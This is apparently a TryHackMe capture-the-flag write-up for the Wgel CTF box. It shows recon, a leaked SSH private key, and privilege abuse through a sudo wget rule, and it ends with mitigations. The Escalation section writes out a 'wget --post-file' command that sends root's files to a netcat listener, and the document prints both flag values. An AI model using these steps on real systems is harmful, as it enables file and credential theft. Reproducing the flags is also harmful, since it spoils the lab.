```
 ██╗    ██╗ ██████╗ ███████╗██╗      ██████╗████████╗███████╗
 ██║    ██║██╔════╝ ██╔════╝██║     ██╔════╝╚══██╔══╝██╔════╝
 ██║ █╗ ██║██║  ███╗█████╗  ██║     ██║        ██║   █████╗
 ██║███╗██║██║   ██║██╔══╝  ██║     ██║        ██║   ██╔══╝
 ╚███╔███╔╝╚██████╔╝███████╗███████╗╚██████╗   ██║   ██║
  ╚══╝╚══╝  ╚═════╝ ╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝
              TryHackMe: Wgel CTF
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-11 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐☆☆☆

> ⏱️ ~8 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: SSH (22), HTTP (80)
- [x] Homepage source: found username `jessie` in HTML comment
- [x] Feroxbuster on `/`: found `/sitemap/` directory
- [x] Feroxbuster on `/sitemap/`: found `/.ssh/id_rsa`
- [x] SSH login as `jessie` using the exposed private key
- [x] Retrieved user flag from `~/Documents/user_flag.txt`
- [x] Identified `sudo wget` with NOPASSWD
- [x] Used `wget --post-file` to exfiltrate `/root/root_flag.txt` to local Netcat listener
- [x] Retrieved root flag

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 🕷️ Feroxbuster: web directory enumeration (two passes)
- 🔑 SSH: login via exposed private key
- 🌐 wget + Netcat: flag exfiltration via `sudo wget --post-file`

---

## ⚡ TL;DR

A username leaked in an HTML comment, an SSH private key sitting in a publicly browsable `.ssh` directory under `/sitemap/`, and a `sudo wget` rule that lets Jessie exfiltrate any file as root. Three steps from landing to root flag: no cracking, no exploits, no escalation chain. Just careful enumeration and one GTFOBins entry.

---

## 📖 Introduction

Today's target is **Wgel CTF**: named after the typo-laden tool that ends up doing all the privilege escalation work. The box is a masterclass in the compounding effect of small missteps: a developer comment naming a real user, a `.ssh` directory left browsable inside a web folder, and a `sudo` rule granting `wget` to a non-root user without a password. None of these individually feels catastrophic. Together they form a straight line from the homepage to `/root/root_flag.txt`. Jessie was told to update the website. Jessie did not update the website. We did something worse.

### Prerequisites

Readers are assumed to know:

- How SSH key-based authentication works
- What directory listing exposure means in a web context
- What `wget --post-file` does and why `sudo wget` is dangerous

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

*Full-range sweep with RustScan, Nmap for service and version fingerprinting:*

```bash
rustscan -a 10.49.152.239 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80/tcp | HTTP | Apache httpd 2.4.18 (Ubuntu) |

Standard two-port setup. Apache 2.4.18 on Ubuntu 16.04: same vintage as several other boxes in this series. No Nmap script findings worth noting beyond the basics.

### Homepage Source: Username in a Comment

The homepage is an Apache default page with a Bootstrap-based sitemap template underneath. `Ctrl+U` reveals:

```html
<!-- Jessie don't forget to udate the webiste -->
```

Username: `jessie`. The typo (`udate`) suggests this was written in a hurry and never cleaned up: which tracks with the rest of the box's security posture.

### Web Directory Enumeration: Pass 1

*Feroxbuster on the root with the medium wordlist:*

```bash
feroxbuster -u http://10.49.152.239/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,html
```

```
# output (relevant hits only)
301  http://10.49.152.239/sitemap    # ^^^ template site lives here
```

The root is just an Apache default page. Everything of interest is under `/sitemap/`.

### Web Directory Enumeration: Pass 2

*(~6 mins into the box)*

*Feroxbuster on `/sitemap/` with the dirb common wordlist: faster and sufficient for this depth:*

```bash
feroxbuster -u http://10.49.152.239/sitemap/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html
```

```
# output (relevant hits only)
301  http://10.49.152.239/sitemap/.ssh          # ^^^ SSH directory: world browsable
200  http://10.49.152.239/sitemap/.ssh/id_rsa   # ^^^ private key, no passphrase
```

A `.ssh` directory sitting inside a web-served folder with directory listing enabled. The private key downloads cleanly with no passphrase protection.

*Downloading the key and setting correct permissions:*

```bash
wget http://10.49.152.239/sitemap/.ssh/id_rsa
chmod 600 id_rsa
```

---

## 🚪 Foothold & Shell / Access

*(~8 mins into the box)*

Username from the HTML comment, unprotected private key from the web server. The SSH login is a formality:

```bash
ssh jessie@10.49.152.239 -i id_rsa
```

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)
jessie@CorpOne:~$
```

No passphrase prompt. In immediately.

*Hunting for the user flag:*

```bash
find . -type f -name "*flag*" -exec cat {} \; -exec realpath {} \;
```

```
057c67131c3d5e42dd5cd3075b198ff6
/home/jessie/Documents/user_flag.txt
```

---

## 📈 Escalation

*(~10 mins into the box)*

### sudo wget: GTFOBins File Exfiltration

*Checking sudo permissions:*

```bash
sudo -l
```

```
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

Two entries worth noting: `(ALL : ALL) ALL` requires jessie's own password: which we don't have. The second entry, `(root) NOPASSWD: /usr/bin/wget`, requires no password at all.

**Why is `sudo wget` dangerous?** `wget` is a file download and upload tool. The `--post-file` flag sends the contents of any local file as the HTTP POST body to a URL of your choice. When run as root, it can read *any file on the system*: including `/root/root_flag.txt`, `/etc/shadow`, SSH keys, anything. The file gets sent to an attacker-controlled listener as raw HTTP request body. It's a complete root-readable file exfiltration primitive dressed up as a download utility.

*Setting up a Netcat listener on the attacking machine:*

```bash
nc -lnvp 1234
```

*Sending the root flag as a POST body via `sudo wget`:*

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://192.168.134.217:1234
```

```
# Netcat listener output
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d   # ^^^ root flag in the POST body
```

Root flag exfiltrated. No root shell needed: wget's file-read capability as root was sufficient for the challenge goal.

---

## 💥 Exploitation

The complete attack chain:

1. **HTML comment** on the homepage → username `jessie`
2. **Feroxbuster on `/sitemap/`** → exposed `/.ssh/id_rsa` with directory listing
3. **SSH login** as `jessie` with the unprotected private key → user flag
4. **`sudo wget --post-file`** → root flag exfiltrated to local Netcat listener

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `057c67131c3d5e42dd5cd3075b198ff6` | `/home/jessie/Documents/user_flag.txt` |
| Root | `b1b968b37519ad1daa6408188649263d` | `/root/root_flag.txt` (exfiltrated via wget) |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Username in HTML comment | Low | Remove all comments containing usernames, internal notes, or infrastructure hints before deploying to production |
| `.ssh/` directory inside web root with directory listing enabled | Critical | Never store SSH keys anywhere under the webroot; disable directory listing with `Options -Indexes` in Apache config |
| SSH private key with no passphrase | High | Always protect private keys with a strong passphrase; use `ssh-keygen -p` to add one retrospectively |
| `sudo wget` with NOPASSWD | Critical | `wget` can read and exfiltrate any file as root via `--post-file`; remove it from `sudoers` entirely: it serves no legitimate administrative purpose there |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** `sudo wget` is not "just a download tool": `--post-file` turns it into a root-powered file exfiltration primitive. Before adding any binary to `sudoers`, check GTFOBins. If it's listed, granting `sudo` on it is granting root-level access to whatever that binary can do. In wget's case, that's reading and transmitting any file on the system.

---

## 🔁 If I Did It Again

Run the second Feroxbuster pass on `/sitemap/` immediately after the first pass rather than waiting: the `.ssh` directory is the only thing that matters on this box and the dirb common wordlist finds it in under 10 seconds. Also skip the broad medium wordlist on the root entirely; the Apache default page signals there's nothing there.

---

## 🔚 Changelog

*Last updated: 2026-06-11*

---

[↑ Back to top](#)
